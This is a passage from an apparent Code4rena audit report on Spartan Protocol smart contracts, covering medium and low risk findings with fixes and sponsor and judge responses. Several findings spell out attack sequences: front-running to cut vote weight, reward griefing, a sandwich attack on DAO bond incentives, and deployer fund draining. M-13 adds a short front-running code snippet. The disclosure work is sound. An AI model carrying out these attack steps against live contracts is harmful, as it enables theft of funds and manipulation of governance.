severity](https://github.com/code-423n4/2021-07-spartan-findings/issues/43#issuecomment-883857718):**\n > A valid issue in reducing annoyance for DAO proposals. Suggested mitigation fixes the issue.\n> Medium Severity.\n\n**[ghoul-sol (judge) commented](https://github.com/code-423n4/2021-07-spartan-findings/issues/43#issuecomment-894836271):**\n > The only attack vector here is DoS attack which could be fought by the community by pooling funds for flashbot TX that front runs the attacker. While inconvenient, it doesn't stop the protocol for long. Agree with sponsor about severity.\n\n## [[M-02] Missleading `onlyDAO` modifiers](https://github.com/code-423n4/2021-07-spartan-findings/issues/172)\n_Submitted by cmichel, 0xRajeev, 0xsanson, gpersoon, also found by hickuphh3 and shw_\n\nSeveral contracts implement an `onlyDAO` modifier which, as the name suggests, should only authorize the function to be executed by the DAO.\nHowever, some implementations are wrong and either allow the DAO or the deployer to execute, or even only the deployer:\n\nIncorrect implementations:\n- `BondVault.onlyDAO`: allows deployer + DAO\n- `DAO.onlyDAO`: allows deployer\n- `DAOVault.onlyDAO`: allows deployer + DAO\n- `poolFactory.onlyDAO`: allows deployer + DAO\n- `Router.onlyDAO`: allows deployer + DAO\n- `Synth.onlyDAO`: allows deployer\n- `synthFactory.onlyDAO`: allows deployer\n- `synthVault.onlyDAO`: allows deployer + DAO\n\nIn all of these functions, the deployer may execute the function as well which is a centralization risk.\nThe deployer can only sometimes be purged, as in `synthFactory`, in which case nobody can execute these functions anymore.\n\nRecommend renaming it to `onlyDeployer` or `onlyDeployerOrDAO` depending on who has access.\n\n**[verifyfirst (Spartan) acknowledged](https://github.com/code-423n4/2021-07-spartan-findings/issues/172#issuecomment-885654542):**\n > This is by design a choice.\n> However, there are current discussions around renaming the high level access modifiers to be more descriptive in their purpose.\n\n**[ghoul-sol (judge) commented](https://github.com/code-423n4/2021-07-spartan-findings/issues/172#issuecomment-894843379):**\n > This is a non-critical issue because there's no in-code bugs, it's rather error-prone naming.\n\n**[ghoul-sol (judge) commented](https://github.com/code-423n4/2021-07-spartan-findings/issues/172#issuecomment-894844125):**\n > On second look, I'll keep it a medium risk as deployer cannot be purged in all contracts which introduces systemic risk.\n\n## [[M-03] Improper access control of `claimAllForMember` allows anyone to reduce the weight of a member](https://github.com/code-423n4/2021-07-spartan-findings/issues/235)\n_Submitted by shw, also found by 0xRajeev_\n\nThe `claimAllForMember` function of `Dao` is permissionless, allowing anyone to claim the unlocked bonded LP tokens for any member. However, claiming a member's LP tokens could decrease the member's weight in the `BondVault`, thus affecting the member's votes and rewards in the `Dao` contract.\n\nFor example, an attacker can intentionally front-run a victim's `voteProposal` call to decrease the victim's vote weight to prevent the proposal from being finalized:\n\n1. Supposing the victim's member weight in the `BondVault` is 201, the total weight is 300. The victim has some LP tokens claimable from the vault, and if claimed, the victim's weight will be decreased to 101. To simplify the situation, assuming that the victim's weight in the `DaoVault` and the total weight of the `DaoVault` are both 0.\n2. The victim wants to vote on the current proposal, which requires the majority consensus. If the victim calls `voteProposal`, the proposal will be finalized since the victim has the majority weight (201/300 > 66.6%).\n3. An attacker does not want the proposal to be finalized, so he calls `claimAllForMember` with the victim as the parameter to intentionally decrease the victim's weight.\n4. As a result, the victim's weight is decreased to 101, and the total weight is decreased to 200. The victim cannot finalize the proposal since he has no majority anymore (101/200 < 66.6%).\n\nSimilarly, an attacker can front-run a victim's `harvest` call to intentionally decrease the victim's reward since the amount of reward is calculated based on the victim's current weight.\n\nSee issue page page for referenced code\n\nConsider removing the `member` parameter in the `claimAllForMember` function and replace all `member` to `msg.sender` to allow only the user himself to claim unlocked bonded LP tokens.\n\n**[verifyfirst (Spartan) confirmed and disagreed with severity](https://github.com/code-423n4/2021-07-spartan-findings/issues/235#issuecomment-886292209):**\n > Although a low risk issue, it is valid and the suggested mitigation is correctly proposed.\n\n**[ghoul-sol (judge) commented](https://github.com/code-423n4/2021-07-spartan-findings/issues/235#issuecomment-894858245):**\n > Making this medium risk as no funds are lost.\n\n## [[M-04] _deposit resetting user rewards can be used to grief them and make them loose rewards via `depositForMember`](https://github.com/code-423n4/2021-07-spartan-findings/issues/66)\n_Submitted by GalloDaSballo_\n\nThe function `_deposit` sets `mapMemberSynth_lastTime` to a date in the future in `synthVault.sol` [L107](https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/synthVault.sol#L107).\n\n`mapMemberSynth_lastTime` is also used to calculate rewards earned. `depositForMember` allows anyone, to \"make a donation\" for the member and cause that member to lose all their accrued rewards. This can't be used for personal gain, but can be used to bring misery to others.\n\n`depositForMember` (in `synthVault.sol` on [L95](https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/synthVault.sol#L95) can be called by anyone.\n\nThis will set the member and can be continuously exploited to make members never earn any reward.\n```solidity\n mapMemberSynth_lastTime[_member][_synth] = block.timestamp + minimumDepositTime; // Record deposit time (scope: member -> synth)\n```\n\nThis is the [second submission](https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/synthVault.sol#L107) under the same exploit.\n\nThis can be mitigated by harvesting for the user right before changing `mapMemberSynth_lastTime[_member][_synth]`\n\n**[verifyfirst (Spartan) commented](https://github.com/code-423n4/2021-07-spartan-findings/issues/66#issuecomment-885457440):**\n > Suggested mitigation solves the issue.\n\n## [[M-05] Pools can be created without initial liquidity](https://github.com/code-423n4/2021-07-spartan-findings/issues/151)\n_Submitted by cmichel_\n\nThe protocol differentiates between public pool creations and private ones (starting without liquidity). However, this is not effective as anyone can just flashloan the required initial pool liquidity, call `PoolFactory.createPoolADD`, receive the LP tokens in `addForMember` and withdraw liquidity again.\n\nRecommend considering burning some initial LP tokens or taking a pool creation fee instead.\n\n**[SamusElderg (Spartan) confirmed](https://github.com/code-423n4/2021-07-spartan-findings/issues/151#issuecomment-886326598):**\n > Whilst we were aware of this (more of a deterrent than prevention) contributors have discussed some methods of locking this liquidity in and making it at least flash loan resistant. For instance, a withdraw-lock (global by pool) for 7 days after the pool's genesis so that no user can withdraw liquidity until 7 days have passed. There are other ideas floating around too; but regardless this issue will be addressed in some way prior to launch\n\n## [[M-06] Pool: `approveAndCall` sets unnecessary approval](https://github.com/code-423n4/2021-07-spartan-findings/issues/154)\n_Submitted by cmichel_\n\nThe `Pool.approveAndCall` function approves the `recipient` contract with the max value instead of only the required `amount`.\n\nFor safety, the approval should not be set to the max value, especially if the amount that the contract may use is already known in this call, like this is the case for `approveAndCall`.\n\nRecommend only approving `amount`.\n\n## [[M-07] Synth: `approveAndCall` sets unnecessary approval](https://github.com/code-423n4/2021-07-spartan-findings/issues/155)\n_Submitted by cmichel_\n\nThe `Synth.approveAndCall` function approves the `recipient` contract with the max value instead of only the required `amount`.\n\nFor safety, the approval should not be set to the max value, especially if the amount that the contract may use is already known in this call, like this is the case for `approveAndCall`.\n\nRecommend only approving `amount`.\n\n## [[M-08] `SynthVault` deposit lockup bypass](https://github.com/code-423n4/2021-07-spartan-findings/issues/167)\n_Submitted by cmichel_\n\nThe `SynthVault.harvestSingle` function can be used to mint & deposit synths without using a lockup. An attacker sends `BASE` tokens to the pool and then calls `harvestSingle`. The inner `iPOOL(_poolOUT).mintSynth(synth, address(this));` call will mint synth tokens to the vault based on the total `BASE` balance sent to the pool, including the attacker's previous transfer.\nThey are then credited the entire amount to their `weight`.\n\nThis essentially acts as a (mint +) deposit without a lock-up period.\n\nRecommend syncing the pool before sending `BASE` to it through `iRESERVE(_DAO().RESERVE()).grantFunds(reward, _poolOUT);` such that any previous `BASE` transfer is wasted. This way only the actual reward's weight is increased.\n\n**[verifyfirst (Spartan) disputed](https://github.com/code-423n4/2021-07-spartan-findings/issues/167#issuecomment-885649798):**\n > Although this is true, the attacker is not benefiting from any gain.\n> They are only minting extra synths into the synthVault into their weight.\n> It is no different to - minting and then staking into the vault.\n>\n\n**[SamusElderg (Spartan) confirmed](https://github.com/code-423n4/2021-07-spartan-findings/issues/167#issuecomment-888150116):**\n > @verifyfirst (Spartan) in my opinion this one should be confirmed and the recommended mitigation also makes sense; any attempt to send in BASE by a bad actor can be attributed to the existing LPers instead\n\n## [[M-09] In the beginning its relatively easy to gain majority share](https://github.com/code-423n4/2021-07-spartan-findings/issues/14)\n_Submitted by gpersoon_\n\nWhen the DAO is just deployed it is relatively easy to gain a large (majority) share, by depositing a lot in the `DAOVault` and/of `BONDVault`. Then you could submit a proposal and vote it in. Luckily there is a `coolOffPeriod` of 3 days.\nBut if others are not paying attention in these 3 days you might get your vote passed by voting for it with your majority share.\nThe riskiest proposal would be to replace the DAO (moveDao), because that way you could take over everything.\n\nRecommend pay attention to the proposals when the DAO is just deployed In [Dao.sol](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Dao.sol) and making sure you initially have a majority vote.\n\n**[verifyfirst (Spartan) acknowledged](https://github.com/code-423n4/2021-07-spartan-findings/issues/14#issuecomment-885428514):**\n > The recommended mitigation steps were already going to be in place for mainNet including emissions etc.\n\n## [[M-10] `grantFunds` will revert after a DAO upgrade.](https://github.com/code-423n4/2021-07-spartan-findings/issues/17)\n_Submitted by gpersoon_\n\nWhen the DAO is upgraded via `moveDao`, it also updates the DAO address in BASE. However it doesn't update the DAO address in the `Reserve.sol` contract. This could be done with the function `setIncentiveAddresses(..)`\n\nNow the next time `grantFunds` of `DAO.sol` is called, its tries to call `_RESERVE.grantFunds(...)`\n\nThe `grantFunds` of `Reserve.sol` has the modifier `onlyGrantor()`, which checks the msg`.sender` == DAO.\nHowever in the mean time, the DAO has been updated and `Reserve.sol` doesn't know about it and thus the modifier will not allow access to the function. Thus `grantFunds` will revert.\n\n`Dao.sol` [L452](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Dao.sol#L452)\n```solidity\nfunction moveDao(uint _proposalID) internal {\n    address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed new address\n    require(_proposedAddress != address(0), \"!address\"); // Proposed address must be valid\n    DAO = _proposedAddress; // Change the DAO to point to the new DAO address\n    iBASE(BASE).changeDAO(_proposedAddress); // Change the BASE contract to point to the new DAO address\n    daoHasMoved = true; // Set status of this old DAO\n    completeProposal(_proposalID); // Finalise the proposal\n}\n\nfunction grantFunds(uint _proposalID) internal {\n    uint256 _proposedAmount = mapPID_param[_proposalID]; // Get the proposed SPARTA grant amount\n    address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed SPARTA grant recipient\n    require(_proposedAmount != 0, \"!param\"); // Proposed grant amount must be valid\n    require(_proposedAddress != address(0), \"!address\"); // Proposed recipient must be valid\n    _RESERVE.grantFunds(_proposedAmount, _proposedAddress); // Grant the funds to the recipient\n    completeProposal(_proposalID); // Finalise the proposal\n}\n```\n`Reserve.sol` [L17](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/outside-scope/Reserve.sol#L17)\n```solidity\nmodifier onlyGrantor() {\n    require(msg.sender == DAO || msg.sender == ROUTER || msg.sender == DEPLOYER || msg.sender == LEND || msg.sender == SYNTHVAULT, \"!DAO\");\n    _;\n}\n\nfunction grantFunds(uint amount, address to) external onlyGrantor {\n    ....\n}\n\nfunction setIncentiveAddresses(address _router, address _lend, address _synthVault, address _Dao) external onlyGrantor {\n    ROUTER = _router;\n    LEND = _lend;\n    SYNTHVAULT = _synthVault;\n    DAO = _Dao;\n}\n```\nRecommend calling `setIncentiveAddresses(..)` when a DAO upgrade is done.\n\n**[verifyfirst (Spartan) confirmed](https://github.com/code-423n4/2021-07-spartan-findings/issues/17#issuecomment-885430701):**\n > Non critical, however this will be implemented to future proof the protocol\n\n## [[M-11] Block usage of `addCuratedPool` ](https://github.com/code-423n4/2021-07-spartan-findings/issues/6)\n_Submitted by gpersoon, also found by hickuphh3, and cmichel_\n\nThe function `curatedPoolCount()` contains a for loop over the array `arrayPools`. If `arrayPools` would be too big then the loop would run out of gas and `curatedPoolCount()` would revert. This would mean that `addCuratedPool()` cannot be executed anymore (because it calls `curatedPoolCount()` )\n\nThe array `arrayPools` can be increased in size arbitrarily by repeatedly doing the following:\n- create a pool with `createPoolADD()`  (which requires 10,000 SPARTA)\n- empty the pool with `remove()` of Pool.sol, which gives back the SPARTA tokens\nThese actions will use gas to perform.\n\n\n```solidity\n// https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/poolFactory.sol#L45\nfunction createPoolADD(uint256 inputBase, uint256 inputToken, address token) external payable returns(address pool){\n    require(getPool(token) == address(0)); // Must be a valid token\n    require((inputToken > 0 && inputBase >= (10000*10**18)), \"!min\"); // User must add at least 10,000 SPARTA liquidity & ratio must be finite\n    Pool newPool; address _token = token;\n    if(token == address(0)){_token = WBNB;} // Handle BNB -> WBNB\n    require(_token != BASE && iBEP20(_token).decimals() == 18); // Token must not be SPARTA & it's decimals must be 18\n    newPool = new Pool(BASE, _token); // Deploy new pool\n    pool = address(newPool); // Get address of new pool\n    mapToken_Pool[_token] = pool; // Record the new pool address in PoolFactory\n    _handleTransferIn(BASE, inputBase, pool); // Transfer SPARTA liquidity to new pool\n    _handleTransferIn(token, inputToken, pool); // Transfer TOKEN liquidity to new pool\n    arrayPools.push(pool); // Add pool address to the pool array\n    ..\n\nfunction curatedPoolCount() internal view returns (uint){\n    uint cPoolCount;\n    for(uint i = 0; i< arrayPools.length; i++){\n        if(isCuratedPool[arrayPools[i]] == true){\n            cPoolCount += 1;\n        }\n    }\n    return cPoolCount;\n}\n```\n\n```solidity\nfunction addCuratedPool(address token) external onlyDAO {\n    ...\n    require(curatedPoolCount() < curatedPoolSize, \"maxCurated\"); // Must be room in the Curated list\n```\n\n\n```solidity\n// https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Pool.sol#L187\nfunction remove() external returns (uint outputBase, uint outputToken) {\n    return removeForMember(msg.sender);\n}\n\n// Contract removes liquidity for the user\nfunction removeForMember(address member) public returns (uint outputBase, uint outputToken) {\n    uint256 _actualInputUnits = balanceOf(address(this)); // Get the received LP units amount\n    outputBase = iUTILS(_DAO().UTILS()).calcLiquidityHoldings(_actualInputUnits, BASE, address(this)); // Get the SPARTA value of LP units\n    outputToken = iUTILS(_DAO().UTILS()).calcLiquidityHoldings(_actualInputUnits, TOKEN, address(this)); // Get the TOKEN value of LP units\n    _decrementPoolBalances(outputBase, outputToken); // Update recorded BASE and TOKEN amounts\n    _burn(address(this), _actualInputUnits); // Burn the LP tokens\n    iBEP20(BASE).transfer(member, outputBase); // Transfer the SPARTA to user\n    iBEP20(TOKEN).transfer(member, outputToken); // Transfer the TOKENs to user\n    emit RemoveLiquidity(member, outputBase, outputToken, _actualInputUnits);\n    return (outputBase, outputToken);\n}\n```\nRecommend creating a variable `curatedPoolCount` and increase it in `addCuratedPool` and decrease it in `removeCuratedPool`.\n\n**[verifyfirst (Spartan) confirmed and disagreed with severity](https://github.com/code-423n4/2021-07-spartan-findings/issues/6#issuecomment-885424168):**\n > We agree with the issue, this could be more efficient.\n\n## [[M-12] `BondVault.sol`: Possibly unwithdrawable bondedLP funds in `claimForMember()` + `claimRate` never zeros after full withdrawals](https://github.com/code-423n4/2021-07-spartan-findings/issues/42)\n_Submitted by hickuphh3, also found by 0xRajeev_\n\nA host of problems arise from the L110-113 of the `claimForMember()` function, where `_claimable` is deducted from the bondedLP balance before the condition check, when it should be performed after (or the condition is changed to checking if the remaining bondedLP balance to zero).\n\n```jsx\n// L110 - L113\nmapBondAsset_memberDetails[asset].bondedLP[member] -= _claimable; // Remove the claim amount from the user's remainder\nif(_claimable == mapBondAsset_memberDetails[asset].bondedLP[member]){\n\tmapBondAsset_memberDetails[asset].claimRate[member] = 0; // If final claim; zero-out their claimRate\n}\n```\n**1. Permanently Locked Funds**\n\nIf a user claims his bonded LP asset by calling `dao.claimForMember()`, or a malicious attacker helps a user to claim by calling `dao.claimAllForMember()`, either which is done such that `_claimable` is exactly half of his remaining bondedLP funds of an asset, then the other half would be permanently locked.\n\n- Assume `mapBondAsset_memberDetails[asset].bondedLP[member] = 2 * _claimable`\n- L110: `mapBondAsset_memberDetails[asset].bondedLP[member] = _claimable`\n- L111: The if condition is satisfied\n- L112: User's claimRate is erroneously set to 0 ⇒ `calcBondedLP()` will return 0, ie. funds are locked permanently\n\n**2. Claim Rate Never Zeroes For Final Claim**\n\nOn the flip side, should a user perform a claim that enables him to perform a full withdrawal (ie. `_claimable` = `mapBondAsset_memberDetails[asset].bondedLP[member]`, we see the following effects:\n\n- L110: `mapBondAsset_memberDetails[asset].bondedLP[member] = 0`\n- L111: The if condition is not satisfied, L112 does not execute, so the member's claimRate for the asset remains non-zero (it is expected to have been set to zero).\n\nThankfully, subsequent behavior remains as expected since `calcBondedLP` returns zero as `claimAmount` is set to the member's bondedLP balance (which is zero after a full withdrawal).\n\nThe `_claimable` deduction should occur after the condition check. Alternatively, change the condition check to `if (mapBondAsset_memberDetails[asset].bondedLP[member] == 0)`.\n\n**[verifyfirst (Spartan) confirmed](https://github.com/code-423n4/2021-07-spartan-findings/issues/42#issuecomment-885453442):**\n > Good find, suggested mitigation solves the potential to lock funds.\n\n## [[M-13] Vulnerable Pool initial rate.](https://github.com/code-423n4/2021-07-spartan-findings/issues/23)\n_Submitted by jonah1005_\n\n`Pool` is created in function `createPoolADD`. The price (rate) of the token is determined in this function. Since the address is deterministic, the attacker can front-run the `createPoolADD` transaction and sends tokens to Pool's address. This would make the pool start with an extreme price and create a huge arbitrage space.\n\nI assume pools would be created by the deployer rather than DAO at the early stage of the protocol.\nIf the deployer calls `createPoolADD` and `addCuratedPool` at the same time then an attacker/arbitrager could actually get (huge) profit by doing this.\n\nAssume that the deployer wants to create a BNB pool at an initial rate of 10000:300 and then make it a curated pool.\nAn arbitrager can send 2700 BNB to the (precomputed) pool address and make iBNB 10x cheaper. The arbitrager can mint the synth at a 10x cheaper price before the price becomes normal.\n\n`poolFactory.sol` [L45-L62](https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/poolFactory.sol#L45-L62)\n```solidity\npre_computed_dai_pool_address = '0x1007BDBA1BCc3C94e20d57768EF9fc0b1Cc2844b'\ndai.functions.transfer(pre_computed_dai_pool_address, initial_amount*10).transact({'from': w3.eth.accounts[1]})\ninitial_amount = 10000*10**18\ndai.functions.approve(pool_factory.address, initial_amount*10).transact()\nbase.functions.approve(pool_factory.address, initial_amount).transact()\npool_factory.functions.createPoolADD(initial_amount, initial_amount, dai.address).transact()\n```\n\nRecommend adding:\n```solidity\n require(iBEP20(BASE).balanceOf(address(pool)) == 0 && iBEP20(token).balanceOf(address(pool)) == 0, \"initial balance should be zero\");\n```\nIn `createPoolADD`\n\n**[verifyfirst (Spartan) acknowledged](https://github.com/code-423n4/2021-07-spartan-findings/issues/23#issuecomment-885452428):**\n > Curated pools will only be added once the community feel a pool is deep enough in Liquidity.\n> Other safeguard measures are also in place for this scenario which probably weren't documented well enough.\n\n## [[M-14] BondVault `BASE` incentive can be gamed](https://github.com/code-423n4/2021-07-spartan-findings/issues/178)\n_Submitted by cmichel_\n\n`BondVault` deposits match _any_ deposited `token` amount with the `BASE` amount to provide liquidity, see [Docs](https://docs.spartanprotocol.org/tokenomics-1/sparta) and `DAO.handleTransferIn`.\nThe matched `BASE` amount is the **swap amount** of the `token` trade in the pool.\nAn attacker can manipulate the pool and have the `DAO` commit `BASE` at bad prices which they then later buys back to receive a profit on `BASE`. This is essentially a sandwich attack abusing the fact that one can trigger the `DAO` to provide `BASE` liquidity at bad prices:\n\n1. Manipulate the pool spot price by dripping a lot of `BASE` into it repeatedly (sending lots of smaller trades is less costly due to the [path-independence of the continuous liquidity model](https://docs.thorchain.org/thorchain-finance/continuous-liquidity-pools)). This increases the `token` per `BASE` price.\n2. Repeatedly call `DAO.bond(amount)` to drip `tokens` into the `DAO` and get matched with `BASE` tokens to provide liquidity. (Again, sending lots of smaller trades is less costly.) As the pool contains low `token` but high `BASE` reserves, the `spartaAllocation = _UTILS.calcSwapValueInBase(_token, _amount)` swap value will be high. **The contract sends even more BASE to the pool to provide this liquidity**.\n3. Unmanipulate the pool by sending back the `tokens` from 1. As a lot more `BASE` tokens are in the reserve now due to the DAO sending it, the attacker will receive more `BASE` as in 1. as well, making a profit\n\nThe DAO's Bond allocation can be stolen.\nThe cost of the attack is the trade fees in 1. + 3. as well as the tokens used in 2. to match the `BASE`, but the profit is a share on the `BASE` supplied to the pool by the DAO in 2.\n\nTrack a TWAP spot price of the `TOKEN <> BASE` pair and check if the `BASE` incentive is within a range of the TWAP. This circumvents that the `DAO` commits `BASE` at bad prices.\n\n**[verifyfirst (Spartan) acknowledged and disagreed with severity](https://github.com/code-423n4/2021-07-spartan-findings/issues/178#issuecomment-885408113):**\n > Implementing a TWAP needs more discussion and ideas to help with price manipulation.\n> Attacking BOND is limited by its allocation, time and the fact that it's locked over 6months.\n\n**[ghoul-sol (judge) commented](https://github.com/code-423n4/2021-07-spartan-findings/issues/178#issuecomment-894864184):**\n > Per sponsor comment making this medium risk\n\n## [[M-15] `DEPLOYER` can drain DAOVault funds + manipulate proposal results](https://github.com/code-423n4/2021-07-spartan-findings/issues/27)\n_Submitted by hickuphh3_\n\n2 conditions enable the `DEPLOYER` to drain the funds in the `DAOVault`.\n\n- `DAOVault` is missing `purgeDeployer()` function\n- `onlyDAO()` is callable by both the `DAO` and the `DEPLOYER`\n\nThe `DEPLOYER` can, at any time, call `depositLP()` to increase the LP funds of any account, then call `withdraw()` to withdraw the entire balance.\n\nThe only good use case for the `DEPLOYER` here is to help perform emergency withdrawals for users. However, this could use a separate modifier, like `onlyDeployer()`.\n\n1. `DEPLOYER` calls `depositLP()` with any arbitrary amount (maybe DAOVault's pool LP balance - Alice's deposited LP balance) for Alice and pool to increase their weight and balance.\n2. At this point, Alice may vote for a proposal to swing it in her favour, or remove it otherwise (to implicitly vote against it)\n3. `DEPLOYER` calls `withdraw()` for the Alice, which removes 100% of her balance (and therefore, the entire DAOVault's pool balance)\n\n- Create a separate role and modifier for the `DEPLOYER`, so that he is only able to call `withdraw()` but not `depositLP()`\n- Include the missing `purgeDeployer()` function.\n\n**[verifyfirst (Spartan) acknowledged](https://github.com/code-423n4/2021-07-spartan-findings/issues/27#issuecomment-883841672):**\n > We are already aware of the privilege level the deployer holds with returning user funds to user's wallet.\n> We disagree with the severity of this issue - however, agree it can be used to manipulate user's weight from a proposal.\n> We will include the purge deployer into the vault to resolve this issue.\n\n**[ghoul-sol (judge) commented](https://github.com/code-423n4/2021-07-spartan-findings/issues/27#issuecomment-894864608):**\n > Privileged deployer is common in early stage protocols but because of lack of `purgeDeployer` function, I'll keep this medium risk.\n\n# Low Risk (35)\n\n## [[L-01] Event log poisoning by griefing attackers](https://github.com/code-423n4/2021-07-spartan-findings/issues/104)\n\nEvent log poisoning is possible by griefing attackers who have no DAO weight but vote and emit event that takes up event log space. See [L382](https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/) and [L393](https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Dao.sol#L393) in `Dao.sol`.\n\nRecommend emitting event only if non-zero weight as relevant to proposal voting/cancelling.\n\n**[SamusElderg (Spartan) confirmed](https://github.com/code-423n4/2021-07-spartan-findings/issues/104#issuecomment-885517148):**\n > Good point; @verifyfirst (Spartan) should we make the event conditional or is it used anywhere when the vote is zeroed out?\n> From memory when zeroed-out it is simply done via mappings and doesn't emit an event anyway so probably safe to conditional this one (or remove it if we aren't using it in any user-facing interface)\n\n**[verifyfirst (Spartan) commented](https://github.com/code-423n4/2021-07-spartan-findings/issues/104#issuecomment-886320106):**\n > Yep, a conditional is a good one\n\n## [[L-02] Attackers can grief voting by removing votes just before finalization](https://github.com/code-423n4/2021-07-spartan-findings/issues/105)\n\n\nAttackers, i.e. malicious DAO members, can grief voting by removing their votes just before finalization and if that takes it below quorum, it forces others to vote and restarts another cooloff period of 3 days. This will delay the finalisation of targeted proposals and the griefing attackers lose nothing in penalty. See issue page for referenced code.\n\n**Recommend**:\n1. Redesign to allow vote removal only within a certain window after voting and locking it thereafter.\n2. Removal of votes should have an associated penalty\n\n**[SamusElderg (Spartan) acknowledged](https://github.com/code-423n4/2021-07-spartan-findings/issues/105#issuecomment-885518556):**\n > I don't agree with locking up voters; as we all know people like to press buttons and sometimes form an opinion later; need to allow them to change their mind (or have their mind changed by good discussion)\n>\n> However, a fee/penalty of sorts for removeVote is an interesting discussion point 👍 @verifyfirst (Spartan)\n\n**[verifyfirst (Spartan) commented](https://github.com/code-423n4/2021-07-spartan-findings/issues/105#issuecomment-886319389):**\n > I agree with the suggestion of a removeVote penalty to reduce the unlikely grieving\n\n## [[L-03] Pool.sol: `swapTo()` should not be payable](https://github.com/code-423n4/2021-07-spartan-findings/issues/46)\n\nThe `swapTo()` function should not be payable since the WBNB-SPARTA pool should not receive BNB, but WBNB. The router swap functions handles the wrapping and unwrapping of BNB.\n\nFurthermore, the `swapTo()` will not detect any deposited BNB, so any `swapTo()` calls that have msg.value > 0 will have their BNB permanently locked in the pool contract.\n\n\nRecommend removing `payable` keyword in `swapTo()`.\n\n## [[L-04] Incorrect event parameter used in emit](https://github.com/code-423n4/2021-07-spartan-findings/issues/119)\n\nIncorrect event parameter `outputAmount` is used (instead of output) in the MintSynth event emit. `outputAmount` is a named return variable that is never set in this function and so will always be 0. This should instead be output. This will confuse the UI or offchain monitoring tools that 0 synths were minted and will lead to users panicking/complaining or trying to mint synth again.\n\n\nRecommend replacing `outputAmount` with output in the emit.\n\n**[verifyfirst (Spartan) confirmed](https://github.com/code-423n4/2021-07-spartan-findings/issues/119#issuecomment-886317197):**\n > Code needs refactoring\n\n## [[L-05] Missing check for `toPool != fromPool`](https://github.com/code-423n4/2021-07-spartan-findings/issues/127)\n\n`zapLiquidity()` used to trade LP tokens of one pool to another is missing a check for toPool != fromPool which may happen accidentally. The check will prevent unnecessary transfers and avoid any fees/slippage or accounting errors.\n\nRecommend adding `toPool` != `fromPool` as part of input validation.\n\n**[verifyfirst (Spartan) confirmed](https://github.com/code-423n4/2021-07-spartan-findings/issues/127#issuecomment-886314691):**\n > Although very low risk, recommended mitigation is valid\n\n## [[L-06] Unnecessary redundant check for `basisPoints`](https://github.com/code-423n4/2021-07-spartan-findings/issues/129)\n\nThe threshold check for `basisPoints` while a required part of input validation is an unnecessary redundant check because `calcPart()` does a similar upper bound check and the lower bound check on 0 is only an optimization.\n\nRecommend removing redundant check to save gas and improve readability/maintainability.\n\n## [[L-07] Missing `isListedPool` checks may lead to lock/loss of user funds](https://github.com/code-423n4/2021-07-spartan-findings/issues/130)\n\nThis `isListedPool` check implemented by `isPool()` is missing in many functions of the contract that accept pool/token addresses from users. `getPool()` returns the default mapping value of 0 for token that do not have valid pools. This lack of input validation may lead to use of zero/invalid pool addresses in the protocol context and reverts in the best case or burn/loss of user funds in the worst case.\n\nRecommend combine `isPool()` `isListedPool` check to `getPool()` so that it always returns a valid/listed pool in the protocol.\n\n**[verifyfirst (Spartan) acknowledged and confirmed](https://github.com/code-423n4/2021-07-spartan-findings/issues/130#issuecomment-886314162):**\n > Code can be cleaner\n\n## [[L-08] Number of curated pools can only be 10 at any point](https://github.com/code-423n4/2021-07-spartan-findings/issues/134)\n\nWithout a setter for curatedPoolSize, the number of curated pools at any point can only be a max of 10 forever, and will require removing one to accommodate another one. It is unclear if this is intentional and a requirement of the protocol.\n\nRecommend a setter for `curatedPoolSize` that allows DAO to increase it if/when required. If not, document the hardcoded limit of curated pools number.\n\n## [[L-09] Incorrect event parameter logs zero address instead of WBNB](https://github.com/code-423n4/2021-07-spartan-findings/issues/135)\n\nThe token argument used in `CreatePool` event emit of `createPoolADD()` should really be _token so that WBNB address is logged in the event instead of zero address when token == 0. Logging a zero address could confuse off-chain user interfaces because it is treated as a burn address by convention.\n\nRecommend using _token instead of token in event emit.\n\n**[SamusElderg (Spartan) confirmed](https://github.com/code-423n4/2021-07-spartan-findings/issues/135#issuecomment-886561822):**\n > Non-critical, but makes sense; will change this 👍\n\n## [[L-10] Missing check for already curated pool being re-curated](https://github.com/code-423n4/2021-07-spartan-findings/issues/137)\n\n`addCuratedPool()` is missing a `require(isCuratedPool[_pool] == false)` check, similar to the one in `removeCuratedPool` to ensure that the DAO is not trying to curate an already curated pool which indicates a mismatch of assumption/accounting compared to the contract state.\n\n\nRecommend adding `require(isCuratedPool[_pool] == false)` before setting `isCuratedPool[_pool]` = true.\n\n**[SamusElderg (Spartan) confirmed](https://github.com/code-423n4/2021-07-spartan-findings/issues/137#issuecomment-886323645):**\n > Check needs to be added for this issue\n\n## [[L-11] Inconsistent value of `burnSynth` between Pool and Synth](https://github.com/code-423n4/2021-07-spartan-findings/issues/70)\n\nWhen users try to born synth, the fee and the value of Sparta is calculated at contract `Pool` while the logic of burning `Pool`s Lp and Synth is located at `Synth` contract.\n\nUsers can send synth to the `Synth` contract directly and trigger `burnSynth` at the `Pool` contract. The Pool would not send any token out while the `Synth` contract would burn the lp and Synth.\nWhile users can not drain the liquidity by doing this, breaking the AMM rate unexpectedly is may lead to troubles.  The calculation of debt and the fee would end up with a wrong answer.\n\nPool's `burnSynth` and Synth's `burnSynth` are tightly coupled functions. In fact, according to the current logic, `Synth:burnSynth` should only be triggered from a valid `Pool` contract.\n\nIMHO, applying the`Money in - Money Out` model in the `Synth` contract does more harm than good to the readability and security of the protocol. Consider to let `Pool` contract pass the parameters to the `Synth` contract and add a require check in the `Synth` contract.\n\n[L-12] [`synthVault.sol`: `_processWithdraw`: Replace `synthReward` with principle](https://github.com/code-423n4/2021-07-spartan-findings/issues/45)\n\n## [[L-13] Missing zero-address checks in constructors and setters](https://github.com/code-423n4/2021-07-spartan-findings/issues/93)\n\nChecking addresses against zero-address 